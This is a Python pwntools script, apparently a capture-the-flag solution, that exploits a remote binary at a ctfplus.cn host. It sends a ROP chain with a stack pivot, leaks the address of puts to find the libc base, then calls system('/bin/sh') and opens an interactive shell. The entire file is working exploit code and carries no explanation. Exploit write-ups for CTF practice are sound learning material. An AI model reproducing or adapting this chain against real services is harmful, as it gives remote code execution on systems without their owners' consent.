from pwn import *

context.arch = "amd64"
context.os = "linux"

io = remote("nc1.ctfplus.cn", 44195)

pop_rdi = 0x40123f
leave = 0x40129a
retn = 0x40101a

plt_read = 0x401050
plt_puts = 0x401040
vuln = 0x401244

global_buf = 0x4047a0
global_buf_ends = 0x40499f
got_puts = 0x404020

prefix = "[-]"

pl1 = flat(
    0,

    retn,

    pop_rdi, got_puts,
    plt_puts,

    vuln
).ljust(0x200, b"A")

print(prefix, ("Payload 1:\n" + hexdump(pl1)).replace("\n", "\n" + prefix + " "))
io.recvuntil(b"Step 1: Send your ROP payload to the safe house:\n")
io.send(pl1)

pl2 = flat(
    b"A" * 16,
    global_buf,
    leave
)

print(prefix, ("Payload 2:\n" + hexdump(pl2)).replace("\n", "\n" + prefix + " "))
io.recvuntil(b"Step 2: Trigger the pivot:\n")
io.send(pl2)

puts = u64(io.recv(6) + b'\x00\x00')
print(prefix, ("puts: \n" + hexdump(puts)).replace("\n", "\n" + prefix + " "))

puts_offset = 0x80e10
libc_base = puts - puts_offset
system_offset = 0x50d70
system = libc_base + system_offset
binsh_offset = 0x1d8678
binsh = libc_base + binsh_offset

pl3 = flat(
    0,

    retn,

    pop_rdi, binsh,
    system
).ljust(0x200, b"A")

print(prefix, ("Payload 3:\n" + hexdump(pl3)).replace("\n", "\n" + prefix + " "))
io.recvuntil(b"Step 1: Send your ROP payload to the safe house:\n")
io.send(pl3)

io.interactive()